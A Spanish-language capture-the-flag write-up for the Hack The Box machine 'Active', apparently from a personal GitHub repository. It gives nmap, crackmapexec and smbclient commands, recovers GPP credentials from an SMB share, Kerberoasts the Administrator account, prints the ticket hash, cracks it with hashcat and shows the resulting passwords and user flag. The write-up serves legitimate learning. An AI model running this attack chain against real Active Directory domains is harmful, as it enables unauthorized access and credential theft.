# Active-HTB-WriteUp

# **Máquina: [Active]**


## **Información General**

| Machine Info              |              |
| ------------------------- | ------------ |
| **IP**                    | 10.10.10.100 |
| **Dificultad**            | Easy         |
| **Sistema Operativo**     | Windows      |
| **Método de Explotación** |              |

---

## **1️ - Escaneo y Enumeración**

```
sudo nmap -sC -sS --min-rate 5000 --open -Pn -oN /home/alien/4ly3nzz/HTB/Active/enum/scan_Active 10.10.10.100
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 18:32 CEST
Nmap scan report for 10.10.10.100
Host is up (0.036s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49165/tcp open  unknown

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-04T16:32:53
|_  start_date: 2025-06-03T11:53:47
```

### SMB Enumeration

```
crackmapexec smb 10.10.10.100 -u '' -p '' --shares
```
<img width="859" height="211" alt="Pasted image 20250604184134" src="https://github.com/user-attachments/assets/ab3c331e-75a1-4d7e-9525-7f31067a99dc" />



```
smbclient //10.10.10.100/Replication -N
```
<img width="641" height="303" alt="Pasted image 20250604184501" src="https://github.com/user-attachments/assets/aefee43a-2d88-4522-8482-5728c562224c" />


- Encontramos un xml con credenciales dentro.

<img width="856" height="190" alt="Pasted image 20250604185119" src="https://github.com/user-attachments/assets/2a03f706-64b8-4272-b951-7d00081c9986" />


SVC_TGS 
GPPstillStandingStrong2k18

- Ahora podemos ver que tenemos acceso a mas recursos compartidos.

```
crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
```

<img width="903" height="214" alt="Pasted image 20250604191813" src="https://github.com/user-attachments/assets/c93bc622-a6f2-49c8-9889-9c0749751a9b" />


- Nos conectamos a la carpeta Users con las creedenciales.

```
smbclient //10.10.10.100/Users -U SVC_TGS
```

<img width="616" height="362" alt="Pasted image 20250604192002" src="https://github.com/user-attachments/assets/710ac4da-9f5d-4ae3-8613-1c798b2bdbbb" />

- La flag de user.

<img width="617" height="95" alt="Pasted image 20250604192224" src="https://github.com/user-attachments/assets/31b6b6b4-2940-4685-9143-42a38deca0d6" />

### ASP

```
impacket-GetUserSPNs -request 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-06-03 13:55:01.363767             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$d97ef59683009eff5a1f8e6f21ab0529$d54d86d260a5b0d47368e0b216476f3879e545dce894232f0e59d7ebce92a3d54a38404eb5f2e3bdf4bc353e92c0c9a6a76550ee707f74c9dd03c111841d6fc6ecee157610ea7003f5d8470356411c44deffa76714ff62936dc1f26f51dcc1ccc26a0e36119dc2bf251c7425db8ae2173d40c18939fd86879193df99e72ee155d991e9be78f85335398491aa535dc0268387026996f01847ff1d0f2acdc1092de9e427f3bd689c590c175a19876b65b6c49ee826b4aa6f190eb3e2f38376619f1771b37f22b00e2543a1fff9ef262c905911876b1254ed34c758e4c528b0570a6b3ae61c5e0a3a65d62849073b9969f004c382cb502caf380ce37dae2e084b9c790286f0c9a83c4553b29976ffe811bebfecb0ceadd993a4068a01d481c66e03b4c8db6d152d17085f6481831a5774c976b4dee86fe79054c9123137785fc7fa67a986c75939a520f2226132311dbd3aae24a19cc3cf6a7860bb36f2930b464b2618a332a7aae84375df95f65ae4b2a57a4420245811bf4a40839c93b1dc6a3be75a199bd79d3504cd2e529586be156f49cf5fa0793a8a8d42502f89d05f5f7c4c93aec31d3b42e361d60d33259124989342f2cf8f0c51bf3e0a4d4684b8ea1dc8ed118270847872212e747a9188659bf1612ed00734d6404d5a7109891e39907f95bd8baa984272e65d5e5f55d36e9d2c01720bcc0b3f5456770be92e3b13fca0d84fa3e0b3667ba3b10857588adf4afb1e5dbc34fbc72ffba1821a1387d532dedbd74e905c17540282d0eb3884831f2e3da280db9b1ecb89d145bb9047805db795fb34f32e2036cf5ae2f4c320dad9efd73d468c13b627b2196443d997614561b6dba3e6bac7a9b33905ac19a2928d688c8a7a21d4b27022e4115c231d8ec2465946a2b88d40cfa4d1de62f98b8aa75243956e422db926b6c6554a59161bfeb962bb265b2fca7f871fc964ee3fa5d277ea51abcd4c047fef1627d9f6871de1a92c553d7803d30c0af02c4b4d2e0eb975537a45cb4d53e7181d1a617067815ee7b5abd955a96bd387ce463a19b3c08770e85ae49a8d0fa1e8d68a7576ed55f93ebff56ceca751618005f6ad2b509ecefa9b7866958459300620d59d197813af3b84d8cffe0108806ef13fc548df21cda026f4b4610d6428a75af7a69349b1416620165bc81607d8abd7d4318cf26787441fa03dd617199c600235e9aa1237e77a2c4088f656c027dde3cc8b037a1b47adb632216c8156e3ce24

```

### Hashcat $krb5tgs$23

```
hashcat -m 13100 -a 0 hash /usr/share/wordlists/rockyou.txt
```

<img width="431" height="195" alt="Pasted image 20250604193126" src="https://github.com/user-attachments/assets/09c68eaf-d8b1-4b3f-a33c-daef8a101087" />

Administrator:Ticketmaster1968

```
crackmapexec smb 10.10.10.100 -u Administrator -p Ticketmaster1968 
```

<img width="1203" height="108" alt="Pasted image 20250604193636" src="https://github.com/user-attachments/assets/a9c1ca60-8e51-4065-9a51-77aac90c5f4e" />

---

## **2️ - Explotación Inicial**

```
smbclient //10.10.10.100/C$ -U Administrator   
```

<img width="1131" height="769" alt="Pasted image 20250604195859" src="https://github.com/user-attachments/assets/f592d287-f8ae-4866-9474-d69f69269006" />

---

## **3️ - Escalada de Privilegios**



---

## **4️ - Obtención de Flags**

| **User Flag** | ad61fd69e87cafb69c5e95ac297f3555 |
| ------------- | -------------------------------- |
| **Root Flag** | ******************************** |

---
